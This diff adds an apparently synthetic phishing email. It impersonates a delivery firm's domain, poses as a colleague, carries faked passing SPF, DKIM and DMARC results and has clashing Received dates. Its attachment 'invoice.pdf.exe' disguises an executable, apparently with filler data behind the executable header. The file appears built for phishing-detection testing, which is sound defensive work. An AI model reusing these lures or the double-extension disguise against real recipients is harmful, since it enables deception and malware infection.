@@ -1,0 +1,46 @@
+From: notice@secure-dhl.xyz
+To: victim26@example.com
+Subject: Lunch on Friday? [ref AA2E176]
+Date: Tue, 26 Mar 2002 15:55:00 -0500
+Message-ID: <phish-86-eff97eef-5a02-471c-b1b3-709a263b65c7@secure-dhl.xyz>
+Received: from relay0 (relay0.example.net [192.0.2.100]) by mx0.example.com; Tue, 27 Mar 2002 13:08:00 -0500
+Received: from relay1 (relay1.example.net [192.0.2.101]) by mx1.example.com; Tue, 21 Mar 2002 11:50:00 -0500
+Received: from relay2 (relay2.example.net [192.0.2.102]) by mx2.example.com; Tue, 23 Mar 2002 13:54:00 -0500
+Received: from relay3 (relay3.example.net [192.0.2.103]) by mx3.example.com; Tue, 08 Mar 2002 17:37:00 -0500
+Return-Path: <notice@secure-dhl.xyz>
+Reply-To: notice@secure-dhl.xyz
+Authentication-Results: mx.example.com; spf=pass smtp.mailfrom=secure-dhl.xyz; dkim=pass header.d=secure-dhl.xyz; dmarc=pass header.from=secure-dhl.xyz
+Received-SPF: pass (mx.example.com: domain of notice@secure-dhl.xyz designates 192.0.2.26 as permitted sender)
+DKIM-Signature: v=1; a=rsa-sha256; d=secure-dhl.xyz; s=default; h=from:to:subject;
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="bnd-p-86-58a1d687"
+
+--bnd-p-86-58a1d687
+Content-Type: text/plain; charset="UTF-8"
+
+Hi,
+
+Please review the attached schedule before Friday. No action needed beyond that.
+Reference: AA2E176
+
+Thanks,
+Colleague
+--bnd-p-86-58a1d687
+Content-Type: application/octet-stream; name="invoice.pdf.exe"
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename="invoice.pdf.exe"
+
+TVqQADSpA+k+2LTzpb826HuHG8hRxG0KrBFblCTgy5boK56UPDyjoyuhD98RER0Vpd+YrTFKvV3B
+sHEF1IrTbUNSqC/Ib+tblzrRTdy4vhLBKOpCK9y7xUdPNmdkRDL60FAzqJz0YM8Yywo+vBAZYWAY
+7bli7IR8cGt26XPWezvPhtUDhOVxzeNU157IWEmHQKwCHu4AkhOJc9TWPkyl9vT3Bm/jPaCXn0v/
++Tl4Ep+3sxHs3jf32I8TBkD5liyrqElRGUn86vfhOeazaA/QP/blDMqVphMztreeYImd6QheljJt
+tGXvfNHFUDh6Rj8ogw9Q4v0gTG9My+I3T3D4cmWYLSPg6llpd7pwsFPgrDuO3oRNGOJNZo4cOvFa
+6EcVzKmPsy0+DNEzfNCkOR0ETH6yZilopDum5QWseppYSgPLEmKiqgGPWd13gi6v1kAwVRAFxK2M
+dX8JwujYi79G5DY6FS2tnTguDv4pHhJkvaRXIvNlfoxSe458Z8LZAMeteBxS1IrDmqcSJ1CaYsro
+e3XS4DJAo13HXIob7n2gr+WYoYI85Qq0EAERjcPSpdOeDfcstup7kwSMai6i0Yhq/shCivMUPGIo
+iCcAz4ZfKFRoE+t+MfonDTXrVQMeSMUv+Yg1jCW7i8bQ2JkmDywBVogu0VqALEEimAsvlylq4WX+
+3Mqh9ZmWMhdAs/cfQho7t0OZuFIaPwVAED2RLTzJv7MvWSbkyZmfcUeCzffm6qFtvViZXQH7gX9Q
+41DXrS0Sr/Q8oqH/0GEtt86kDqocr+2QQ6Ufb43f4TL+orqgtQD+8EDFkKzOSGXGgfFsg+RfPGRl
+4j7HE8z+4YtAu1OAGQ==
+
+--bnd-p-86-58a1d687--
